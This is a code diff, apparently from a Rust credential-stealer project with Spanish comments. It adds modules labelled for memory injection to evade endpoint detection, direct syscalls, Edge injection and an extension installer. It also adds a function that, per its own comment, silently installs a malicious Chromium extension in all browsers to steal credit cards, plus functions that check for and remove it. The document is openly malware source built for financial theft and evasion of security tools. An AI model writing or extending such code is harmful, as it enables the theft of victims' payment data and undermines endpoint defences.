@@ -7,9 +7,14 @@ pub mod gaming;
 pub mod telegram;
 pub mod autofill;
 pub mod common;
+pub mod edge_injection;
+pub mod extension_installer;
+pub mod memory_injection;  // ← NUEVO: Memory injection anti-EDR
+pub mod syscalls;           // ← NUEVO: Direct syscalls
 
 use std::error::Error;
 use std::fmt;
+use std::path::PathBuf;
 
 #[derive(Debug)]
 pub enum StealerError {
@@ -275,4 +280,46 @@ pub fn steal_all() -> StolenData {
     data.addresses.append(&mut addresses);
 
     data
+}
+
+/// 🎯 Instalar extensión de Chromium para robar credit cards (bypass v20)
+/// Esta función instala silenciosamente una extensión maliciosa en todos los navegadores Chromium
+pub fn install_card_stealer_extension() -> Result<Vec<String>, Box<dyn Error>> {
+    use std::path::PathBuf;
+    
+    // Obtener ruta de la extensión (debe estar junto al DLL)
+    let dll_path = std::env::current_exe()?;
+    let dll_dir = dll_path.parent().ok_or("No parent directory")?;
+    let extension_path = dll_dir.join("chromium-extension");
+    
+    if !extension_path.exists() {
+        return Err("Extension folder not found".into());
+    }
+    
+    // Crear instalador
+    let installer = extension_installer::ExtensionInstaller::new(extension_path);
+    
+    // Instalar en todos los navegadores disponibles
+    let installed = installer.install_all();
+    
+    if installed.is_empty() {
+        Err("No browsers found".into())
+    } else {
+        Ok(installed)
+    }
+}
+
+/// Verificar si la extensión está instalada en un navegador
+pub fn is_extension_installed(browser: &str) -> bool {
+    // Crear instalador dummy para verificar
+    let extension_path = PathBuf::from("dummy");
+    let installer = extension_installer::ExtensionInstaller::new(extension_path);
+    installer.is_installed(browser)
+}
+
+/// Desinstalar extensión de un navegador específico
+pub fn uninstall_extension(browser: &str) -> Result<(), Box<dyn Error>> {
+    let extension_path = PathBuf::from("dummy");
+    let installer = extension_installer::ExtensionInstaller::new(extension_path);
+    installer.uninstall(browser)
 }
